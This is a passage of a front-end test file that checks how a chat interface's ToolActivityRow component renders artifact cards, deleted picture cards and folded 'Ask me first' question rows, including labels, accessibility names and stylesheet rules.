		});

		it("ignores alfyActivity about a DIFFERENT artifact", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-other", get(t)),
				alfyActivity: {
					key: "call-1",
					artifactId: "some-other-artifact",
					toolName: "edit_artifact",
					status: "applied",
					label: null,
					patches: [],
					refusedBlocks: [],
					appliedCount: 2,
				},
			});

			const head = getByTestId("artifact-card-head");
			expect(head).not.toHaveTextContent("changes to review");
			expect(head).toHaveTextContent("Open");
		});

		// Wave 2.5 Step 13: wires ArtifactCardView.current to the panel's own
		// open item, matched by the bare artifact id (never the workspace item
		// id "artifact:" + id — see `activeArtifactId`'s own prop doc).
		it("outlines the card and reads 'Open in panel' when activeArtifactId matches this card's own artifact", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(artifactSegment(), "row-current", get(t)),
				activeArtifactId: "artifact-1",
			});

			const head = getByTestId("artifact-card-head");
			expect(head).toHaveTextContent("Open in panel");
		});

		it("reads plain 'Open' when activeArtifactId names a DIFFERENT artifact", () => {
			const { getByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(
					artifactSegment(),
					"row-not-current",
					get(t),
				),
				activeArtifactId: "some-other-artifact",
			});

			const head = getByTestId("artifact-card-head");
			expect(head).not.toHaveTextContent("Open in panel");
			expect(head).toHaveTextContent("Open");
		});

		// Wave 2.5 Step 13: the App's fact-check line, read off `body.preview.
		// appVerification` — attached by `ThinkingBlock.svelte` from
		// `ConversationDetail.artifacts`, exactly like the Document card's own
		// `documentPreview` (this row only ever reads `item.body`, never
		// `conversationArtifacts` itself, so the test builds that same shape
		// directly rather than through a prop this component does not have).
		it("shows the App's fact-check line on the card once its facts were checked", () => {
			const segment = artifactSegment({
				name: "create_artifact",
				input: { artifactType: "app", title: "Trip budget splitter" },
				metadata: {
					ok: true,
					artifactId: "app-1",
					artifactKind: "app",
					artifactTitle: "Trip budget splitter",
				},
			});
			const built = buildToolActivityItem(segment, "row-factcheck", get(t));
			const withPreview: ToolActivityItem = {
				...built,
				body: {
					...(built.body as Extract<
						ToolActivityItem["body"],
						{ kind: "artifact" }
					>),
					preview: {
						id: "app-1",
						kind: "app",
						title: "Trip budget splitter",
						conversationId: "conv-1",
						versionNumber: 1,
						commentCount: 0,
						updatedAt: 0,
						appVerification: { checked: true, verdict: "repaired" },
					},
				},
			};
			const { getByTestId } = render(ToolActivityRow, { item: withPreview });

			const head = getByTestId("artifact-card-head");
			expect(head.parentElement).toHaveTextContent(
				"Alfy checked the facts and fixed one thing.",
			);
		});

		// Slice 3: a board's card says how many blocks it holds, from the count
		// the server put on `body.preview.canvasPreview` — the chat never loads the
		// board to say it.
		it("shows a board's block count on its card, from the server's preview", () => {
			const segment = artifactSegment({
				name: "create_artifact",
				input: { artifactType: "canvas", title: "Vienna trip board" },
				metadata: {
					ok: true,
					artifactId: "board-1",
					artifactKind: "canvas",
					artifactTitle: "Vienna trip board",
				},
			});
			const built = buildToolActivityItem(segment, "row-canvas", get(t));
			const withPreview: ToolActivityItem = {
				...built,
				body: {
					...(built.body as Extract<
						ToolActivityItem["body"],
						{ kind: "artifact" }
					>),
					preview: {
						id: "board-1",
						kind: "canvas",
						title: "Vienna trip board",
						conversationId: "conv-1",
						versionNumber: 7,
						commentCount: 0,
						updatedAt: Date.now() - 2 * 60 * 1000,
						canvasPreview: { blockCount: 11 },
					},
				},
			};
			const { getByTestId } = render(ToolActivityRow, { item: withPreview });

			// The card says when the board last changed, never its version number.
			expect(getByTestId("artifact-card-head")).toHaveTextContent(
				"Canvas · 11 blocks · edited 2 min ago",
			);
			expect(getByTestId("artifact-card-head")).not.toHaveTextContent(/\bv7\b/);
		});

		it("says just Canvas on a board's card until its count has arrived (a board made mid-turn)", () => {
			const built = buildToolActivityItem(
				artifactSegment({
					input: { artifactType: "canvas", title: "Vienna trip board" },
					metadata: {
						ok: true,
						artifactId: "board-1",
						artifactKind: "canvas",
						artifactTitle: "Vienna trip board",
					},
				}),
				"row-canvas-live",
				get(t),
			);
			const { getByTestId } = render(ToolActivityRow, { item: built });
			expect(getByTestId("artifact-card-head")).not.toHaveTextContent("block");
			expect(getByTestId("artifact-card-head")).toHaveTextContent("Canvas");
		});

		it("shows a skeleton standalone card while create_artifact is running, from the model's own call arguments", () => {
			const { getByTestId, queryByTestId } = render(ToolActivityRow, {
				item: buildToolActivityItem(
					toolCall({
						name: "create_artifact",
						input: { artifactType: "app", title: "Trip budget splitter" },
						status: "running",
					}),
					"row-creating",
					get(t),
				),
			});

			const card = getByTestId("tool-activity-standalone-card");
			expect(card).toHaveTextContent("Alfy is writing…");
			expect(queryByTestId("tool-activity-body")).not.toBeInTheDocument();
		});

		it("a refused create's card shows its code's sentence, not the model's words", () => {
			const refused = (metadata: Record<string, string | boolean>) =>
				render(ToolActivityRow, {
					item: buildToolActivityItem(
						toolCall({
							name: "create_artifact",
							input: { artifactType: "app", title: "Trip budget splitter" },
							status: "done",
							outputSummary:
								"Per-turn limit reached: 3 new artifacts already created in this turn.",
							metadata: { ok: false, artifactKind: "app", ...metadata },
						}),
						"row-failed",
						get(t),
					),
				});

			// The per-turn cap: a stop on purpose, in its own sentence.
			const capped = refused({ reasonCode: "reply_limit_reached" });
			expect(
				capped.getByTestId("tool-activity-standalone-card"),
			).toHaveTextContent(
				"Alfy has already made as many new items as one reply allows.",
			);
			expect(capped.container).not.toHaveTextContent("Per-turn limit");
			expect(
				capped.queryByTestId("tool-activity-body"),
			).not.toBeInTheDocument();
			capped.unmount();

			// No code, or one this version does not know: the create fallback.
			const unnamed: Record<string, string | boolean>[] = [
				{},
				{ reasonCode: "a_newer_servers_code" },
			];
			for (const metadata of unnamed) {
				const fallback = refused(metadata);
				const card = fallback.getByTestId("tool-activity-standalone-card");
				expect(card).toHaveTextContent("This couldn't be made.");
				expect(card).not.toHaveTextContent("Per-turn limit");
				expect(fallback.container).not.toHaveTextContent(
					"a_newer_servers_code",
				);
				fallback.unmount();
			}
		});

		it("a reload's persisted segment renders the exact same card — no live-only state involved", () => {
			// Nothing here distinguishes "live" from "after a reload": both cases
			// hand the SAME tool-call segment shape to buildToolActivityItem, so
			// a persisted segment (no different from a freshly-streamed one)
			// renders identically.
			const persisted = buildToolActivityItem(
				artifactSegment(),
				"row-reload",
				get(t),
			);
			const { getByTestId } = render(ToolActivityRow, {
				item: persisted,
			});
			expect(getByTestId("artifact-card")).toBeInTheDocument();
			expect(getByTestId("tool-activity-row")).toHaveTextContent(
				"Weekend plan",
			);
		});
	});
});

describe("ToolActivityRow, a picture card whose Image is gone (plan 2b T2)", () => {
	beforeEach(() => {
		uiLanguage.set("en");
	});

	function pictureRow(): ToolActivityItem {
		const built = item({
			name: "make_image",
			callId: "call-pic",
			input: { prompt: "a lighthouse", title: "Lighthouse" },
			metadata: {
				ok: true,
				imageStatus: "succeeded",
				imageCardId: "card-1",
				imageTakeId: "take-x",
			},
		});
		const body = built.body as Extract<
			NonNullable<ToolActivityItem["body"]>,
			{ kind: "image-card" }
		>;
		return {
			...built,
			body: {
				...body,
				card: pictureCard([pictureTake({ fileId: "file-x" })], {
					artifactId: "image-1",
				}),
			},
		};
	}

	const gone = (over: Partial<DeletedArtifacts>): DeletedArtifacts => ({
		deletedIds: [],
		unreachableIds: [],
		regeneratingIds: [],
		unavailableIds: [],
		onRegenerate: vi.fn(),
		...over,
	});

	it("says a deleted picture was deleted, keeps its box, and offers no Open, picture, Another or History", async () => {
		const onImageAction = vi.fn(async () => undefined);
		const onOpenDocument = vi.fn();
		const { getByTestId, findByTestId, queryByText } = render(ToolActivityRow, {
			item: pictureRow(),
			deletedArtifacts: gone({ deletedIds: ["image-1"] }),
			onImageAction,
			onOpenDocument,
		});

		await findByTestId("image-card-gone");
		const head = getByTestId("artifact-card-head");
		expect(head).toHaveTextContent("This picture was deleted");
		expect(head).toBeDisabled();
		expect(getByTestId("artifact-card")).toHaveClass("artifact-card-deleted");
		expect(queryByText("Regenerate")).toBeNull();
		expect(getByTestId("image-card-another")).toBeDisabled();
		expect(
			within(getByTestId("artifact-card")).getByRole("button", {
				name: "More",
				hidden: true,
			}),
		).toBeDisabled();
		expect(getByTestId("image-card-stage").querySelector("img")).toBeNull();
		await fireEvent.click(head);
		expect(onOpenDocument).not.toHaveBeenCalled();
		expect(onImageAction).not.toHaveBeenCalled();
	});

	it("says a picture out of this chat's reach was made in the original chat", async () => {
		uiLanguage.set("hu");
		const { getByTestId, findByTestId } = render(ToolActivityRow, {
			item: pictureRow(),
			deletedArtifacts: gone({
				unreachableIds: ["image-1"],
				deletedIds: ["image-1"],
			}),
		});
		await findByTestId("image-card-gone");
		expect(getByTestId("artifact-card-head")).toHaveTextContent(
			"Az eredeti beszélgetésben készült",
		);
		expect(getByTestId("image-card-gone")).toHaveTextContent(
			"Abban a beszélgetésben nyitható meg, ahol készült.",
		);
	});
});

// "Ask me first": a question that no longer waits folds into the line every finished
// step is drawn as (docs/plans/ask-me-first/mockups.html, section 3). These rows are
// literal items; `buildAskFoldedItem` makes the real ones and has its own test.
describe("ToolActivityRow, a question's folded line (Ask me first)", () => {
	beforeEach(() => {
		uiLanguage.set("en");
	});

	function askItem(
		overrides: Partial<ToolActivityItem> = {},
	): ToolActivityItem {
		return {
			key: "ask-q-1",
			status: "done",
			iconType: "ask",
			verb: "Which way should we take it?",
			object: "A party at home",
			meta: "",
			summaryLabel: "Which way should we take it?",
			pinned: true,
			alwaysOpen: false,
			body: null,
			title: "Which way should we take it? A party at home",
			...overrides,
		};
	}

	const stylesheet = readFileSync(
		`${process.cwd()}/src/lib/components/chat/ToolActivityRow.svelte`,
		"utf-8",
	);

	it("draws a closed row with a muted X and its suffix after the object", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: askItem({ status: "closed", objectSuffix: "· closed" }),
		});

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.status).toBe("closed");
		// A question the person shut is not a failure: no red row.
		expect(row.classList.contains("is-failed")).toBe(false);
		const glyph = row.querySelector(".act-status");
		expect(glyph?.classList.contains("closed")).toBe(true);
		expect(glyph?.classList.contains("failed")).toBe(false);
		expect(glyph?.querySelector(".lucide-x")).not.toBeNull();
		expect(glyph?.querySelector(".lucide-check")).toBeNull();
		// The question, what was answered, then the muted suffix after it.
		const label = row.querySelector(".act-label");
		expect(
			[...(label?.children ?? [])].map((node) => node.textContent),
		).toEqual(["Which way should we take it?", "A party at home", "· closed"]);
		expect(label?.querySelector(".act-object-suffix")?.textContent).toBe(
			"· closed",
		);

		// jsdom applies no component CSS, so the stylesheet is the subject for "muted".
		const mutedGlyph =
			stylesheet.match(
				/\.act-status\.skipped,\s*\.act-status\.closed \{([\s\S]*?)\}/,
			)?.[1] ?? "";
		expect(mutedGlyph).toMatch(/color:\s*var\(--text-muted\)/);
		const suffixRule =
			stylesheet.match(/\.act-object-suffix \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(suffixRule).toMatch(/color:\s*var\(--text-muted\)/);
		expect(suffixRule).toMatch(/white-space:\s*nowrap/);
	});

	it("draws a closed question with nothing to open as a plain line, not a button", () => {
		const { getByTestId } = render(ToolActivityRow, {
			item: askItem({
				status: "closed",
				object: "",
				objectSuffix: "· closed",
				title: "Which way should we take it? · closed",
			}),
		});

		const row = getByTestId("tool-activity-row");
		expect(row.tagName.toLowerCase()).toBe("div");
		expect(row.querySelector(".act-chevron")).toBeNull();
		expect(row.querySelector(".act-object")).toBeNull();
		expect(row.getAttribute("title")).toBe(
			"Which way should we take it? · closed",
		);
		// The question, then the suffix straight after it: no empty answer between.
		expect(
			[...(row.querySelector(".act-label")?.children ?? [])].map(
				(node) => node.textContent,
			),
		).toEqual(["Which way should we take it?", "· closed"]);
	});

	it("ticks a question that was answered, and draws no suffix when there is none", () => {
		const { getByTestId } = render(ToolActivityRow, { item: askItem() });

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.status).toBe("done");
		expect(row.querySelector(".act-status .lucide-check")).not.toBeNull();
		expect(row.querySelector(".act-object-suffix")).toBeNull();
	});

	it("lists each question with its answer in an ask body", async () => {
		const onToggle = vi.fn();
		const folded = askItem({
			verb: "2 questions",
			object: "Adults, Kids · “One list, with a section for the kids' things”",
			body: {
				kind: "ask",
				pairs: [
					{ question: "Who's coming?", answer: "Adults, Kids" },
					{
						question: "How should the list be split?",
						answer: "“One list, with a section for the kids' things”",
					},
				],
			},
		});
		const { getByTestId, queryByTestId, rerender } = render(ToolActivityRow, {
			item: folded,
			onToggle,
		});

		// Folded: a button with a chevron, and nothing below it.
		const row = getByTestId("tool-activity-row");
		expect(row.tagName.toLowerCase()).toBe("button");
		expect(row.getAttribute("aria-expanded")).toBe("false");
		expect(row.querySelector(".act-chevron")).not.toBeNull();
		expect(queryByTestId("tool-activity-body")).toBeNull();
		await fireEvent.click(row);
		expect(onToggle).toHaveBeenCalledWith("ask-q-1");

		await rerender({ item: folded, open: true, onToggle });
		expect(getByTestId("tool-activity-row").getAttribute("aria-expanded")).toBe(
			"true",
		);
		const pairs = [
			...getByTestId("tool-activity-body").querySelectorAll(".act-ask-pair"),
		];
		expect(
			pairs.map((pair) => [
				pair.querySelector(".act-ask-question")?.textContent,
				pair.querySelector(".act-ask-answer")?.textContent,
			]),
		).toEqual([
			["Who's coming?", "Adults, Kids"],
			[
				"How should the list be split?",
				"“One list, with a section for the kids' things”",
			],
		]);

		// The mockup's `.rp` rows: the question muted, the answer in the primary text.
		const question =
			stylesheet.match(/\.act-ask-question \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(question).toMatch(/color:\s*var\(--text-muted\)/);
		const answer =
			stylesheet.match(/\.act-ask-answer \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(answer).toMatch(/color:\s*var\(--text-primary\)/);
	});

	it("draws no tool icon for an ask row", () => {
		const { getByTestId } = render(ToolActivityRow, { item: askItem() });

		const row = getByTestId("tool-activity-row");
		expect(row.dataset.iconType).toBe("ask");
		expect(row.querySelector("[data-tool-icon]")).toBeNull();
		expect(row.querySelector(".tool-activity-icon")).toBeNull();
		// Only the tick stands before the words.
		expect(row.querySelectorAll("svg")).toHaveLength(1);
	});

	it("marks the verb of an ask row, and of no other row, as a question that can be cut", () => {
		const ask = render(ToolActivityRow, { item: askItem() });
		expect(
			ask
				.getByTestId("tool-activity-row")
				.querySelector(".act-verb")
				?.classList.contains("act-verb-question"),
		).toBe(true);
		ask.unmount();

		const other = render(ToolActivityRow, { item: item(searchSegment) });
		expect(
			other
				.getByTestId("tool-activity-row")
				.querySelector(".act-verb")
				?.classList.contains("act-verb-question"),
		).toBe(false);
	});

	it("cuts a long question with an ellipsis, and caps it at 46% only while an answer shares the line", () => {
		// jsdom applies no component CSS, so the stylesheet is the subject, as for the
		// muted look above. The question is the row's verb, and a question can be long.
		const question =
			stylesheet.match(/\.act-verb-question \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(question).toMatch(/flex:\s*0 1 auto/);
		expect(question).toMatch(/min-width:\s*0/);
		expect(question).toMatch(/overflow:\s*hidden/);
		expect(question).toMatch(/text-overflow:\s*ellipsis/);
		expect(question).toMatch(/white-space:\s*nowrap/);
		// No cap of its own: a closed question has nothing after it and keeps the line.
		expect(question).not.toMatch(/max-width/);

		// Beside an answer it takes at most 46%, or its own width when that is less
		// ("2 questions" is never cut), and it does not shrink further: the answer does.
		const capped =
			stylesheet.match(
				/\.act-verb-question:has\(\+ \.act-object\) \{([\s\S]*?)\}/,
			)?.[1] ?? "";
		expect(capped).toMatch(/max-width:\s*46%/);
		expect(capped).toMatch(/flex-shrink:\s*0/);
		const answer = stylesheet.match(/\.act-object \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(answer).toMatch(/min-width:\s*0/);
		expect(answer).toMatch(/text-overflow:\s*ellipsis/);

		// The suffix keeps its room whatever the question and the answer do.
		const suffix =
			stylesheet.match(/\.act-object-suffix \{([\s\S]*?)\}/)?.[1] ?? "";
		expect(suffix).toMatch(/flex:\s*0 0 auto/);
	});

	it("names what Alfy did with the question to a screen reader, the suffix included", () => {
		const { getByRole } = render(ToolActivityRow, {
			item: askItem({
				objectSuffix: "· left to Alfy",
				body: {
					kind: "ask",
					pairs: [
						{
							question: "Which way should we take it?",
							answer: "A party at home",
						},
					],
				},
			}),
		});

		expect(
			getByRole("button", {
				name: "Which way should we take it? A party at home · left to Alfy",
			}),
		).toBeInTheDocument();
	});
});
